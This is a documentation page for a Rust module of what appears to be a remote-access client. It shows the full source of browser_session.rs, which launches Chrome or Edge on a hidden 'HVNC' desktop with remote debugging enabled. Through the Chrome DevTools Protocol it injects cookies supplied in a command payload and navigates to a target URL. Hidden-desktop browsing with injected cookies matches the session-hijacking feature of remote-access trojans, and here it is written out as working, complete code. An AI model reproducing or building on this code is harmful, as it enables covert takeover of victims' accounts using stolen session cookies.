# browser_session

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/browser_session.rs` |
| **Lines** | 368 |
| **Cards** | T023-client-capabilities |
| **Role** | Browser session state |
| **Unsafe blocks** | 1 |

## Constants

- `CREATE_NEW_CONSOLE`: `PROCESS_CREATION_FLAGS` = `PROCESS_CREATION_FLAGS(0x00000010)`

## Types

### struct `BrowserSessionResult` (line 10)

## Public API

### `launch_browser_session_cmd` (line 288)
```rust
pub fn launch_browser_session_cmd(payload: &str) -> String
```
Synchronous command-dispatcher wrapper.
Parses the JSON payload, resolves the HVNC desktop name from current state (if any),
calls launch_browser_session, and returns a JSON result string.

## Internal Functions

- `pick_free_port` — Pick a free TCP port in [min_port, max_port]. (line 34)
- `find_browser_exe` — Find the browser executable path in standard locations. (line 53)
- `launch_on_desktop` — Launch a process on the named desktop using Win32 CreateProcessW. (line 85)

## Key Dependencies

- `use serde::{Deserialize, Serialize};`
- `use serde_json::{json, Value};`
- `use tracing::{info, error};`
- `use super::*;`
- `use windows::Win32::Foundation::{FALSE, CloseHandle};`
- `use windows::Win32::System::Threading::{`
- `use windows::core::PWSTR;`
- `use tokio_tungstenite::{connect_async, tungstenite::Message};`
- `use futures_util::SinkExt;`

## Full Source

```rust
// Browser session launcher: creates an isolated desktop, launches Chromium with CDP,
// injects cookies, and navigates to a target URL.
// Windows-only functionality; a stub is provided for other platforms.

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use tracing::{info, error};

#[derive(Debug, Serialize, Deserialize)]
pub struct BrowserSessionResult {
    pub port: u16,
    pub tab_ws_url: String,
    pub cookies_set: usize,
    pub navigated_url: String,
}

// ── Windows implementation ────────────────────────────────────────────────────

#[cfg(windows)]
mod win_impl {
    use super::*;
    use std::net::{TcpListener, SocketAddr, IpAddr, Ipv4Addr};
    use std::time::Duration;

    use windows::Win32::Foundation::{FALSE, CloseHandle};
    use windows::Win32::System::Threading::{
        CreateProcessW, PROCESS_CREATION_FLAGS, STARTUPINFOW, PROCESS_INFORMATION,
    };
    use windows::core::PWSTR;

    const CREATE_NEW_CONSOLE: PROCESS_CREATION_FLAGS = PROCESS_CREATION_FLAGS(0x00000010);

    /// Pick a free TCP port in [min_port, max_port].
    fn pick_free_port(min_port: u16, max_port: u16) -> anyhow::Result<u16> {
        // Shuffle-like approach: try sequentially from a random offset.
        let range = (max_port - min_port + 1) as usize;
        let seed = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.subsec_nanos() as usize)
            .unwrap_or(0);
        let start = seed % range;
        for i in 0..range {
            let port = min_port + ((start + i) % range) as u16;
            let addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), port);
            if TcpListener::bind(addr).is_ok() {
                return Ok(port);
            }
        }
        anyhow::bail!("No free port found in range {}-{}", min_port, max_port)
    }

    /// Find the browser executable path in standard locations.
    fn find_browser_exe(browser_exe_hint: &str) -> Option<String> {
        // If the caller provided a full path that exists, use it.
        if std::path::Path::new(browser_exe_hint).exists() {
            return Some(browser_exe_hint.to_string());
        }

        let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let program_files = std::env::var("PROGRAMFILES").unwrap_or_else(|_| {
            "C:\\Program Files".to_string()
        });
        let program_files_x86 = std::env::var("PROGRAMFILES(X86)").unwrap_or_else(|_| {
            "C:\\Program Files (x86)".to_string()
        });

        let candidates: &[&str] = &[
            &format!("{}\\Google\\Chrome\\Application\\chrome.exe", local_app_data),
            &format!("{}\\Google\\Chrome\\Application\\chrome.exe", program_files),
            &format!("{}\\Google\\Chrome\\Application\\chrome.exe", program_files_x86),
            &format!("{}\\Microsoft\\Edge\\Application\\msedge.exe", local_app_data),
            &format!("{}\\Microsoft\\Edge\\Application\\msedge.exe", program_files),
            &format!("{}\\Microsoft\\Edge\\Application\\msedge.exe", program_files_x86),
        ];

        for &path in candidates {
            if std::path::Path::new(path).exists() {
                return Some(path.to_string());
            }
        }
        None
    }

    /// Launch a process on the named desktop using Win32 CreateProcessW.
    fn launch_on_desktop(exe_path: &str, args: &str, desktop_name: &str) -> anyhow::Result<u32> {
        let cmd_str = format!("\"{}\" {}", exe_path, args);
        let mut cmd_wide: Vec<u16> = cmd_str.encode_utf16().chain(Some(0)).collect();
        let desktop_name_wide: Vec<u16> = desktop_name.encode_utf16().chain(Some(0)).collect();

        unsafe {
            let si = STARTUPINFOW {
                cb: std::mem::size_of::<STARTUPINFOW>() as u32,
                lpDesktop: PWSTR(desktop_name_wide.as_ptr() as *mut u16),
                ..Default::default()
            };
            let mut pi = PROCESS_INFORMATION::default();

            CreateProcessW(
                None,
                PWSTR(cmd_wide.as_mut_ptr()),
                None,
                None,
                FALSE,
                CREATE_NEW_CONSOLE,
                None,
                None,
                &si,
                &mut pi,
            )
            .map_err(|e| anyhow::anyhow!("CreateProcessW failed: {}", e))?;

            let pid = pi.dwProcessId;
            CloseHandle(pi.hThread).ok();
            CloseHandle(pi.hProcess).ok();
            info!("BrowserSession: launched {} on desktop '{}' (PID {})", exe_path, desktop_name, pid);
            Ok(pid)
        }
    }

    /// Poll GET http://localhost:{port}/json/version until it responds (max `attempts` × 200ms).
    async fn wait_for_cdp(port: u16, max_attempts: usize) -> bool {
        let client = match reqwest::Client::builder()
            .timeout(Duration::from_millis(1500))
            .build()
        {
            Ok(c) => c,
            Err(e) => {
                error!("BrowserSession: failed to build HTTP client: {}", e);
                return false;
            }
        };

        let url = format!("http://127.0.0.1:{}/json/version", port);
        for attempt in 0..max_attempts {
            tokio::time::sleep(Duration::from_millis(200)).await;
            match client.get(&url).send().await {
                Ok(resp) if resp.status().is_success() => {
                    info!("BrowserSession: CDP ready on port {} (attempt {})", port, attempt + 1);
                    return true;
                }
                _ => {}
            }
        }
        false
    }

    /// GET /json, find the first tab with type=="page", return its webSocketDebuggerUrl.
    async fn find_page_tab_ws_url(port: u16) -> anyhow::Result<String> {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(5))
            .build()?;
        let url = format!("http://127.0.0.1:{}/json", port);
        let text = client.get(&url).send().await?.text().await?;
        let tabs: Vec<Value> = serde_json::from_str(&text)
            .map_err(|e| anyhow::anyhow!("CDP /json parse error: {}", e))?;

        for tab in &tabs {
            if tab.get("type").and_then(|v| v.as_str()) == Some("page") {
                if let Some(ws_url) = tab.get("webSocketDebuggerUrl").and_then(|v| v.as_str()) {
                    return Ok(ws_url.to_string());
                }
            }
        }
        anyhow::bail!("No 'page' type tab found in CDP /json")
    }

    /// Connect to the CDP WebSocket and send Network.enable, Network.setCookies, Page.navigate.
    async fn send_cdp_commands(
        ws_url: &str,
        cookies: &[Value],
        target_url: &str,
    ) -> anyhow::Result<()> {
        use tokio_tungstenite::{connect_async, tungstenite::Message};
        use futures_util::SinkExt;

        let (mut ws, _) = connect_async(ws_url)
            .await
            .map_err(|e| anyhow::anyhow!("CDP WebSocket connect failed: {}", e))?;

        let commands = [
            json!({"id": 1, "method": "Network.enable", "params": {}}),
            json!({"id": 2, "method": "Network.setCookies", "params": {"cookies": cookies}}),
            json!({"id": 3, "method": "Page.navigate", "params": {"url": target_url}}),
        ];

        for cmd in &commands {
            let msg_text = cmd.to_string();
            ws.send(Message::Text(msg_text)).await
                .map_err(|e| anyhow::anyhow!("CDP send failed: {}", e))?;
        }

        ws.close(None).await.ok(); // Best-effort close
        Ok(())
    }

    /// Core async implementation.
    pub async fn launch_browser_session_async(
        desktop_name: &str,
        browser_exe: &str,
        cookies: Vec<Value>,
        target_url: &str,
    ) -> anyhow::Result<BrowserSessionResult> {
        // 1. Pick free port
        let port = pick_free_port(9200, 9299)
            .map_err(|e| anyhow::anyhow!("Port selection: {}", e))?;

        // 2. Create temp user-data dir
        let tmp_suffix: String = {
            use std::time::{SystemTime, UNIX_EPOCH};
            let ts = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|d| d.subsec_nanos())
                .unwrap_or(0);
            format!("{:08x}", ts)
        };
        let tmp_dir = std::env::temp_dir().join(format!("bsession_{}", tmp_suffix));
        std::fs::create_dir_all(&tmp_dir)
            .map_err(|e| anyhow::anyhow!("Failed to create temp dir: {}", e))?;
        let tmp_dir_str = tmp_dir.to_string_lossy().into_owned();

        // 3. Resolve browser executable
        let exe = find_browser_exe(browser_exe)
            .ok_or_else(|| anyhow::anyhow!("Browser executable not found: {}", browser_exe))?;

        // 4. Build CLI args and launch
        let args = format!(
            "--remote-debugging-port={} --user-data-dir=\"{}\" \
             --no-first-run --no-default-browser-check --disable-extensions --disable-sync",
            port, tmp_dir_str
        );

        launch_on_desktop(&exe, &args, desktop_name)?;

        // 5. Wait for CDP to bind
        let cdp_ready = wait_for_cdp(port, 15).await;
        if !cdp_ready {
            anyhow::bail!("Chrome CDP did not respond on port {} after 3 seconds", port);
        }

        // 6. Find the page tab WebSocket URL
        let tab_ws_url = find_page_tab_ws_url(port).await?;

        // 7. Send CDP commands: Network.enable, Network.setCookies, Page.navigate
        let cookies_count = cookies.len();
        send_cdp_commands(&tab_ws_url, &cookies, target_url).await?;

        info!(
            "BrowserSession: launched on port {}, cookies_set={}, navigated to {}",
            port, cookies_count, target_url
        );

        Ok(BrowserSessionResult {
            port,
            tab_ws_url,
            cookies_set: cookies_count,
            navigated_url: target_url.to_string(),
        })
    }
}

// ── Public entry points ───────────────────────────────────────────────────────

/// Launch a browser session asynchronously.
/// Only functional on Windows.
#[cfg(windows)]
pub async fn launch_browser_session(
    desktop_name: &str,
    browser_exe: &str,
    cookies: Vec<Value>,
    target_url: &str,
) -> anyhow::Result<BrowserSessionResult> {
    win_impl::launch_browser_session_async(desktop_name, browser_exe, cookies, target_url).await
}

#[cfg(not(windows))]
pub async fn launch_browser_session(
    _desktop_name: &str,
    _browser_exe: &str,
    _cookies: Vec<Value>,
    _target_url: &str,
) -> anyhow::Result<BrowserSessionResult> {
    anyhow::bail!("LAUNCH_BROWSER_SESSION is not supported on this platform")
}

/// Synchronous command-dispatcher wrapper.
/// Parses the JSON payload, resolves the HVNC desktop name from current state (if any),
/// calls launch_browser_session, and returns a JSON result string.
pub fn launch_browser_session_cmd(payload: &str) -> String {
    // Parse the command payload
    let params: Value = match serde_json::from_str(payload) {
        Ok(v) => v,
        Err(e) => {
            return json!({
                "ok": false,
                "error": format!("Invalid JSON payload: {}", e)
            }).to_string();
        }
    };

    let browser_exe = params
        .get("browser_exe")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();

    let target_url = params
        .get("target_url")
        .and_then(|v| v.as_str())
        .unwrap_or("about:blank")
        .to_string();

    let desktop_name = params
        .get("desktop_name")
        .and_then(|v| v.as_str())
        .unwrap_or("Default")
        .to_string();

    let cookies: Vec<Value> = params
        .get("cookies")
        .and_then(|v| v.as_array())
        .cloned()
        .unwrap_or_default();

    // Run in the existing Tokio runtime if available, otherwise spawn a new one.
    let result = match tokio::runtime::Handle::try_current() {
        Ok(handle) => {
            // We're inside a Tokio context but this is a sync call,
            // so we need to block via a dedicated thread to avoid deadlocking.
            let (tx, rx) = std::sync::mpsc::channel();
            let dn = desktop_name.clone();
            let be = browser_exe.clone();
            let tu = target_url.clone();
            let co = cookies.clone();
            handle.spawn(async move {
                let r = launch_browser_session(&dn, &be, co, &tu).await;
                let _ = tx.send(r);
            });
            match rx.recv_timeout(std::time::Duration::from_secs(30)) {
                Ok(r) => r,
                Err(_) => Err(anyhow::anyhow!("Timeout waiting for browser session launch")),
            }
        }
        Err(_) => {
            // No runtime, build a local one
            match tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
            {
                Ok(rt) => rt.block_on(launch_browser_session(&desktop_name, &browser_exe, cookies, &target_url)),
                Err(e) => Err(anyhow::anyhow!("Failed to build Tokio runtime: {}", e)),
            }
        }
    };

    match result {
        Ok(res) => json!({
            "ok": true,
            "port": res.port,
            "tab_ws_url": res.tab_ws_url,
            "cookies_set": res.cookies_set,
            "navigated_url": res.navigated_url,
        }).to_string(),
        Err(e) => json!({
            "ok": false,
            "error": e.to_string()
        }).to_string(),
    }
}

```